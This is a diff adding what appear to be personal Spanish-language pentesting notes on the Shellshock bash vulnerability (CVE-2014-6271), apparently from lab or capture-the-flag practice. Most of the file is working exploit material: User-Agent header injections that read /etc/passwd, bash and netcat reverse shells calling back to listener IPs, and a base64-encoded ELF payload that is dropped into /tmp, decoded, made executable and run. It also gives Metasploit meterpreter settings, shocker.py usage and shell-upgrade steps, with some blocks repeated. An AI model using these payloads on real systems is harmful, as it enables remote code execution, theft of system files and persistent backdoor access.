@@ -1,0 +1,112 @@
+USER AGENT manual y con metasploit
+SHELLSOCK https://blog.cloudflare.com/inside-shellshock/
+http mubic shellshocker-pocs
+https://netsec.ws/?p=337
+() {:;}; /bin/cat /etc/passwd
+() {:;};  /BIN/BASH -C 'NC IP:PORT -E /BIN/BASH'
+https://github.com/opsxcq/exploit-CVE-2014-6271
+https://www.youtube.com/watch?v=aa-O5EyCcKc
+curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
+shocker.py
+nmap --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls
+http-shellshock.nse
+curl -A '() {:;}; echo; /bin/bash -i >& /dev/tcp/10.10.14.8/888 0>&1' http://10.10.10.56/cgi-bin/user.sh
+
+() {:;}; echo /bin/echo cadena caracteres /tmp/pay
+() {:;}; echo /bin/cat /tmp/pay \ /usr/bin/base64 -d > /tmp/paybin
+() {:;}; echo /bin/chmod 755 /tmp/paybin
+
+set payload linux/x86 metrerpreter tcp
+show options
+
+curl -A '() { :; }; /usr/bin/nc -l -p 1234 -e /bin/sh ip'
+
+mirar para burpsuite
+fantaghost.com/exploiting-shellsocho-getting-reverse-shell
+
+https://mzfr.github.io/symfonos3
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+-----------------------
+-----------------------
+CVE-2014-6271 ((AFECTA A BASH))En entornos linux
+-----------------------
+Servidores
+----------------
+--Web CGI
+---------------
+--Open SSH
+---------------
+--Qmail
+---------------
+--Shell restringida IMB HMC
+---------------------------
+cgi-bin/status
+---------------------------
+open ssh
+---------------------------
+qmail
+---------------------------
+USER AGENT manual y con metasploit
+SHELLSOCK https://blog.cloudflare.com/inside-shellshock/
+http mubic shellshocker-pocs
+https://netsec.ws/?p=337
+() {:;}; /bin/cat /etc/passwd
+() {:;};  /BIN/BASH -C 'NC IP:PORT -E /BIN/BASH'
+https://github.com/opsxcq/exploit-CVE-2014-6271
+https://www.youtube.com/watch?v=aa-O5EyCcKc
+curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
+shocker.py
+nmap --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls
+http-shellshock.nse
+curl -A '() {:;};/bin/bash -i >& /dev/tcp/10.10.14.8/888 0>&1' http://10.10.10.56/cgi-bin/user.sh
+----------------------------------
+curl -A '() { :; }; /usr/bin/nc -l -p 3333 -e /bin/sh' http://cgi-bin
+BUSCAR SOCKER .PY
+-----------------------------------
+--------------------------------------
+KALI CON ZAP Y METASPLOIT
+-----------------------------------
+() {:;}; echo /bin/ cadena caracteres /tmp/pay
+() {:;}; echo /bin/cat /tmp/pay \ /usr/bin/base64 -d > /tmp/paybin
+() {:;}; echo /bin/chmod 755 /tmp/paybin
+set payload linux/x86/reverse_tcp
+show options
+-----------------------------
+HERRAMIENTA AUTOMATIZADA
+-----------------------------
+shellsocker.py lo hace todo de forma automatizada
+https://github.com/nccgroup/shocker.git
+-----------------------------
+FUNCIONADO
+-----------------------------
+() { :; };/bin/bash -c 'nc 192.168.0.107:4444 -e /bin/bash'  burpsuite
+
+curl -A '() { :; }; /usr/bin/nc -l -p 3333 -e /bin/sh' http://ip/cgi-bin/status con curl
+nc ip de la victima
+
+use PAYLOAD generate/payload_base6
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+User-Agent:() { :; }; echo /bin/echo f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjqAAAAgAEAAAcAAAAAEAAA3cDZdCT0uGfD4j9bM8mxHzFDGoPDBANDFuKSqehhbfUaft5Ktuvi/F5lAzEe4pii36UeW4i3HooUMf/GwhmvR1wTriuvo7VsVr37GJTVoeHmJf2L5k/4wgS+yxhKRAvb9qysrg6Kst4Q7Ds90Qc3AzHb9/57ZHLA/HUnSB3sYUZuDEDXC9Mi2uw1atsStopnE7aKl9k2 > /tmp/p
+User-Agent:() { :; }; echo; /bin/cat /tmp/p | /usr/bin/base64 -d > /tmp/paybin f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjqAAAAgAEAAAcAAAAAEAAA3cDZdCT0uGfD4j9bM8mxHzFDGoPDBANDFuKSqehhbfUaft5Ktuvi/F5lAzEe4pii36UeW4i3HooUMf/GwhmvR1wTriuvo7VsVr37GJTVoeHmJf2L5k/4wgS+yxhKRAvb9qysrg6Kst4Q7Ds90Qc3AzHb9/57ZHLA/HUnSB3sYUZuDEDXC9Mi2uw1atsStopnE7aKl9k2 > /tmp/p
+User-Agent:() { :; }; echo; /bin/chmod 755 /tmp/paybin
+User-Agent:() { :; }; echo; /tmp/paybin
+
+--------------------------
+--------------------------
+FULL SHELL
+--------------------------
+nc -lvp 9090
+(full shell)python -c 'import pty;pty.spawn("/bin/bash")'
+crtl z
+stty raw -echo
+fg para volver al proceso
+nc -lvp 9090
+-------------------------
+-------------------------
+use exploit/generate_payload_base64
+
+./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
+echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
+echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
+
